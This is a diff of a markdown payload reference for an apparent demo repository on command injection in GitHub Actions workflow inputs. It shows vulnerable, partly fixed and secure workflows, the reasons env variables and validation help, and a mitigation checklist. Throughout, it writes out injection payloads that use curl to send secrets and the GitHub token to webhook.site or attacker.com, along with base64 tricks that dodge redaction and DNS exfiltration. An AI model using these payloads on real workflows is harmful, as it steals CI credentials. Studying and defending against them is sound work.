@@ -1,6 +1,6 @@
 # Attack Payload Examples
 
-Quick reference for testing the vulnerability.
+Quick reference for testing the vulnerability with corrected attack vectors based on actual testing.
 
 ## Setup
 
@@ -10,154 +10,128 @@ Quick reference for testing the vulnerability.
 
 ---
 
-## Attack Payloads
+## Working Attack Payloads
 
-### 1. Exfiltrate the Demo Secret
+### 1. Command Substitution (WORKS on direct interpolation)
+
+**Target:** `vulnerable.yml`
 
 **Package name:**
 ```
-foo"; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "secret=$DEMO_SECRET" #
+$(curl https://webhook.site/YOUR-WEBHOOK-ID?secret=$DEMO_SECRET)
 ```
 
 **Expected result:**
-- Your webhook receives POST request with body: `secret=super-secret-api-key-12345`
+- ✅ Curl executes (see progress output in logs)
+- ✅ Webhook receives GET request with secret parameter
+- ✅ Proves direct `${{ }}` interpolation is exploitable
+
+**Why it works:** GitHub Actions generates the shell command with `$(...)` in it, and the shell executes command substitution before passing the result to git.
 
 ---
 
-### 2. Exfiltrate GitHub Token
+### 2. Command Substitution (BLOCKED by environment variables)
+
+**Target:** `ineffective-fix.yml`
 
 **Package name:**
 ```
-foo"; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "token=$GITHUB_TOKEN" #
+$(curl https://webhook.site/YOUR-WEBHOOK-ID?test=envvar)
 ```
 
 **Expected result:**
-- Your webhook receives the workflow's GitHub token
-- Token can be used to push code, access repos, etc.
+- ❌ Curl does NOT execute
+- ❌ No webhook request received
+- ✅ Proves environment variables provide protection
+
+**Why it's blocked:** The `${{ }}` expression is evaluated once and stored in the environment variable as a literal string. When the shell later expands `${PACKAGE_NAME}`, it doesn't re-evaluate the command substitution.
 
 ---
 
-### 3. Exfiltrate Multiple Secrets
+### 3. Variable Expansion Secret Leak (WORKS on both)
+
+**Target:** Both `vulnerable.yml` and `ineffective-fix.yml`
 
 **Package name:**
 ```
-foo"; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "secret=$DEMO_SECRET&aws=$DEMO_AWS_KEY&token=$GITHUB_TOKEN" #
+leaked-${DEMO_SECRET}
 ```
 
 **Expected result:**
-- All secrets sent in one request
+- ⚠️ Git fails with error showing the secret in the branch name
+- ⚠️ Secret visible in workflow logs
+
+**Example log:**
+```
+fatal: 'update-leaked-super-secret-api-key-12345-1.0.0' is not a valid branch name
+```
+
+**Why it works:** Variable expansion happens in the shell, and error messages include the expanded value.
 
 ---
 
-### 4. Prove Arbitrary Command Execution
+### 4. GitHub Token Exfiltration (WORKS on direct interpolation)
+
+**Target:** `vulnerable.yml`
 
 **Package name:**
 ```
-foo"; echo "=== PWNED ===" && whoami && pwd && ls -la #
+$(curl https://webhook.site/YOUR-WEBHOOK-ID/token-$(echo $GITHUB_TOKEN | base64 | cut -c1-30))
 ```
 
 **Expected result:**
-- Workflow logs show:
-  ```
-  === PWNED ===
-  runner
-  /home/runner/work/repo-name/repo-name
-  (directory listing)
-  ```
+- ✅ Webhook receives request with base64-encoded token preview in URL path
 
 ---
 
-### 5. Create Malicious File
+### 5. Multi-Command with File Storage (WORKS on direct interpolation)
+
+**Target:** `vulnerable.yml`
 
 **Package name:**
 ```
-foo"; echo "attacker-controlled-content" > /tmp/backdoor.sh && cat /tmp/backdoor.sh #
+$(echo $DEMO_SECRET > /tmp/secret.txt && curl -X POST https://webhook.site/YOUR-WEBHOOK-ID --data-binary @/tmp/secret.txt)
 ```
 
 **Expected result:**
-- File created in runner's filesystem
-- Could be used for staged attacks
+- ✅ Secret saved to file then uploaded via POST
 
 ---
 
-### 6. Read Repository Contents
+## Attacks That DON'T Work
+
+### ❌ Semicolon Command Chaining (Blocked by quotes + git validation)
 
 **Package name:**
 ```
-foo"; cat .github/workflows/vulnerable.yml #
+foo"; curl https://webhook.site/YOUR-WEBHOOK-ID #
 ```
 
-**Expected result:**
-- Workflow file contents appear in logs
+**Why it doesn't work:**
+- Double quotes in `git checkout -b "..."` keep the entire string as one argument
+- Git validates branch names and rejects those with quotes/semicolons
+- The semicolon never acts as a command separator
 
----
-
-### 7. Exfiltrate via Base64 Encoding (Bypass Redaction)
-
-**Package name:**
-```
-foo"; curl https://webhook.site/YOUR-WEBHOOK-ID/$(echo $GITHUB_TOKEN | base64) #
-```
-
-**Expected result:**
-- Token sent in URL path (base64 encoded)
-- May bypass some log redaction
-
----
-
-### 8. DNS Exfiltration (Stealthy)
-
-**Package name:**
-```
-foo"; nslookup $DEMO_SECRET.YOUR-DOMAIN.com #
-```
-
-**Expected result:**
-- Secret sent via DNS query (if you control DNS server)
-- Harder to detect than HTTP
-
----
-
-### 9. Chain Multiple Commands
-
-**Package name:**
-```
-foo"; SECRET=$DEMO_SECRET; TOKEN=$GITHUB_TOKEN; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "s=$SECRET&t=$TOKEN" #
-```
-
-**Expected result:**
-- Multiple environment variables captured and sent
-
----
-
-### 10. Inject into Git Commands
-
-**Package name:**
-```
-foo"; git config user.email "attacker@evil.com"; git config user.name "Attacker" #
-```
-
-**Expected result:**
-- Git configuration changed
-- Future commits would be authored by attacker
+**Result:** Git fails with "not a valid branch name" error, but curl never executes.
 
 ---
 
 ## Testing Against Each Workflow
 
-### Test Matrix
+### Comparison Matrix
 
-| Payload | vulnerable.yml | ineffective-fix.yml | secure.yml |
-|---------|----------------|---------------------|------------|
-| Payload #1 (secret exfil) | ❌ Vulnerable | ❌ Still Vulnerable | ✅ Blocked |
-| Payload #2 (token exfil) | ❌ Vulnerable | ❌ Still Vulnerable | ✅ Blocked |
-| Payload #4 (command exec) | ❌ Vulnerable | ❌ Still Vulnerable | ✅ Blocked |
+| Attack Payload | vulnerable.yml | ineffective-fix.yml | secure.yml |
+|----------------|----------------|---------------------|------------|
+| `$(curl ...)` | ❌ Executes | ✅ Blocked | ✅ Blocked |
+| `foo"; curl ...` | ✅ Blocked by git | ✅ Blocked by git | ✅ Blocked by validation |
+| `leaked-${SECRET}` | ⚠️ Leaks in logs | ⚠️ Leaks in logs | ✅ Blocked by validation |
+| `` `curl ...` `` | ❌ Executes | ✅ Blocked | ✅ Blocked by validation |
 
 ---
 
 ## Valid Inputs (Should Pass Secure Workflow)
 
-These inputs should pass validation in `secure.yml`:
+These inputs pass validation in `secure.yml`:
 
 ### Valid Package Names
 
@@ -182,150 +156,124 @@ my-awesome-package
 
 ---
 
-## Understanding the Attack
+## Understanding Why Environment Variables Help
 
-### Why Quotes Don't Protect
+### Direct Interpolation Flow
+
+```yaml
+run: git checkout -b "update-${{ inputs.package_name }}"
+```
+
+**Input:** `$(curl evil.com)`
+
+**Step 1:** GitHub Actions evaluates `${{ inputs.package_name }}` → `$(curl evil.com)`
+
+**Step 2:** Shell command becomes: `git checkout -b "update-$(curl evil.com)"`
+
+**Step 3:** Shell sees `$(...)` and executes it → **Attack succeeds**
+
+---
+
+### Environment Variable Flow
 
 ```yaml
 run: git checkout -b "update-${PACKAGE_NAME}"
 env:
-  PACKAGE_NAME: foo"; curl evil.com #
+  PACKAGE_NAME: ${{ inputs.package_name }}
 ```
 
-**Shell sees:**
-```bash
-git checkout -b "update-foo"; curl evil.com #"
-                        ^    ^
-                        |    |
-                        |    Second command starts here
-                        First quote closes here
-```
+**Input:** `$(curl evil.com)`
 
-### Why Environment Variables Don't Help
+**Step 1:** GitHub Actions evaluates `${{ inputs.package_name }}` → `$(curl evil.com)`
 
-```
-Step 1: GitHub evaluates: ${{ inputs.package_name }} → "foo; curl evil.com"
-Step 2: Env var created:  PACKAGE_NAME="foo; curl evil.com"
-Step 3: Shell expands:    ${PACKAGE_NAME} → "foo; curl evil.com"
-Step 4: Shell parses:     Command boundary at semicolon
-Step 5: Attack succeeds:  curl executes
-```
+**Step 2:** Environment variable is set: `PACKAGE_NAME='$(curl evil.com)'` (as literal string)
 
-**No escaping happens!**
+**Step 3:** Shell command becomes: `git checkout -b "update-${PACKAGE_NAME}"`
 
----
+**Step 4:** Shell expands `${PACKAGE_NAME}` → Gets the literal string `$(curl evil.com)`
 
-## Observing the Attack
+**Step 5:** Git receives literal text, not evaluated command → **Attack blocked**
 
-### In Workflow Logs
-
-Look for:
-- Commands executing after git commands
-- Secrets appearing in logs (partially redacted)
-- Unexpected command output
-
-### In Your Webhook
-
-Check for:
-- POST requests with secret values
-- Base64-encoded tokens in URL path
-- Multiple parameters with sensitive data
-
-### In Git History
-
-After attack:
-```bash
-git log --format="%an <%ae>"
-```
-
-May show attacker's email if they modified git config.
+**Source:** [GitHub Docs - Security Hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
 
 ---
 
 ## Defense Verification
 
-Run this payload through all three workflows:
+### Test 1: Vulnerable (Direct Interpolation)
 
-**Package name:**
-```
-foo"; curl -v https://webhook.site/YOUR-WEBHOOK-ID?secret=$DEMO_SECRET 2>&1 | tee /tmp/exfil.log #
-```
+**Workflow:** `vulnerable.yml`
+**Input:** `$(curl https://webhook.site/YOUR-ID?test=1)`
+**Result:** ❌ Curl executes, secret stolen
 
-**Expected Results:**
+### Test 2: Improved (Environment Variables)
 
-| Workflow | Result |
-|----------|--------|
-| vulnerable.yml | ❌ Secret sent to webhook |
-| ineffective-fix.yml | ❌ Secret sent to webhook |
-| secure.yml | ✅ Validation fails, no curl executed |
+**Workflow:** `ineffective-fix.yml`
+**Input:** `$(curl https://webhook.site/YOUR-ID?test=2)`
+**Result:** ✅ Curl does NOT execute (but validation still missing)
+
+### Test 3: Secure (Environment Variables + Validation)
+
+**Workflow:** `secure.yml`
+**Input:** `$(curl https://webhook.site/YOUR-ID?test=3)`
+**Result:** ✅ Validation rejects input, no execution
 
 ---
 
 ## Real-World Scenario
 
-Imagine this workflow in a production repository:
+### Production Impact
 
-1. **Attacker forks the repo**
-2. **Creates malicious workflow_dispatch trigger**
-3. **Payload:** Exfiltrates all secrets to attacker's server
-4. **Result:** Attacker gains access to:
-   - Production AWS keys
-   - Database credentials
-   - API tokens
-   - Private repository access
+In a real repository with production secrets:
 
-**This is a critical vulnerability!**
-
----
-
-## Proof of Non-Vulnerability (Secure Workflow)
-
-When you run `secure.yml` with attack payloads, you should see:
-
-```
-🔍 Validating package name: foo"; curl https://evil.com
-❌ ERROR: Invalid package name format
-   Package name: foo"; curl https://evil.com
-   Expected format: @scope/package-name or package-name
-   Allowed characters: a-z, A-Z, 0-9, _, -, /, @
-Error: Process completed with exit code 1.
+```yaml
+env:
+  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+  DATABASE_URL: ${{ secrets.DATABASE_URL }}
 ```
 
-**No secrets exfiltrated, no commands executed!**
+**Attack payload (if using direct interpolation):**
+```
+$(curl https://attacker.com?aws=$AWS_ACCESS_KEY_ID-$AWS_SECRET_ACCESS_KEY&db=$DATABASE_URL)
+```
 
----
-
-## Common Questions
-
-### Q: Is this really exploitable in GitHub Actions?
-
-**A: Yes!** Try the payloads above and see for yourself.
-
-### Q: Does GitHub redact secrets in logs?
-
-**A: Partially.** GitHub redacts exact matches, but encoding (base64) or modifying the string can bypass redaction.
-
-### Q: Can this be used to compromise production?
-
-**A: Absolutely.** If your workflows have access to production credentials, an attacker can steal them.
-
-### Q: Why do SAST tools recommend env vars if they don't work?
-
-**A: Many SAST tools have incorrect remediation advice.** Always test fixes!
+**Impact:**
+- Complete AWS account compromise
+- Database credentials stolen
+- Customer data at risk
+- Infrastructure takeover possible
 
 ---
 
 ## Mitigation Checklist
 
-- [ ] Add input validation with regex
+- [ ] Use environment variables (not direct `${{ }}` in `run:`)
+- [ ] Add input validation with regex whitelists
 - [ ] Test validation with attack payloads
 - [ ] Restrict who can trigger workflows
 - [ ] Use `actions/github-script` for complex logic
 - [ ] Review all workflow files for `${{ inputs.* }}` usage
 - [ ] Audit secrets and minimize their scope
 - [ ] Enable branch protection rules
-- [ ] Require code review for workflow changes
 
 ---
 
-**Remember:** Always test security fixes with actual attack payloads!
+## Key Takeaways
+
+1. **Direct `${{ }}` interpolation enables command injection** via command substitution
+2. **Environment variables provide documented protection** per GitHub's official guidance
+3. **But environment variables alone aren't enough** - validation is still required
+4. **The semicolon attack doesn't work** due to quoting + git validation (but don't rely on this)
+5. **Defense-in-depth: use both** environment variables AND input validation
+
+---
+
+## References
+
+- [GitHub Docs: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
+- [GitHub Docs: Secure Use Reference](https://docs.github.com/en/actions/reference/security/secure-use)
+
+---
+
+**Remember:** Always validate untrusted input, even when using environment variables!
